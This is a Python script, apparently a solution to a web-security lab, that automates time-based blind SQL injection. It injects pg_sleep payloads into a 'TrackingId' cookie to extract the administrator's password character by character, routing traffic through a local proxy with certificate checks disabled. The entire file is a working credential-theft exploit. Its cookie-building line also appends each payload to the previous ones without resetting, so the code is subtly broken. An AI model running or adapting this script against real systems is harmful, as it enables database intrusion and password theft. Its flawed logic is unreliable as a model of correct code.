import urllib3
import requests as req
import sys
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def main():
    if len(sys.argv) != 2:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        sys.exit(-1)
    print('[+] Retrieving Administrator Password...')

    cookies = {'TrackingId':'H5b3xXdQwaDhYb6l', 'session':'b1bPmuVAJLehwfM3fXAqf9VQKyKSVpZu'}
    extracted_password = ''
    try:
        for i in range(1,21):
    
            for j in range(32,126):
                current_chr = chr(j)

                sqli_payload = f"'|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{current_chr}') THEN pg_sleep(5) ELSE pg_sleep(-1) END from users) --"
                encoded_sqli_payload = urllib.parse.quote(sqli_payload)

                cookies['TrackingId'] += encoded_sqli_payload
                url = sys.argv[1]
                
                response = req.get(url, cookies=cookies, proxies=proxies, verify=False)

                if response.elapsed.total_seconds() > 5:
                    extracted_password += current_chr
                    sys.stdout.write('\r' + extracted_password)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + extracted_password + current_chr)
                    sys.stdout.flush()

    except KeyboardInterrupt:
        sys.stdout.write('\n')
        print('Exiting...')
    except:
        print('An error occurred')

    return extracted_password



if __name__ == "__main__":
    main()
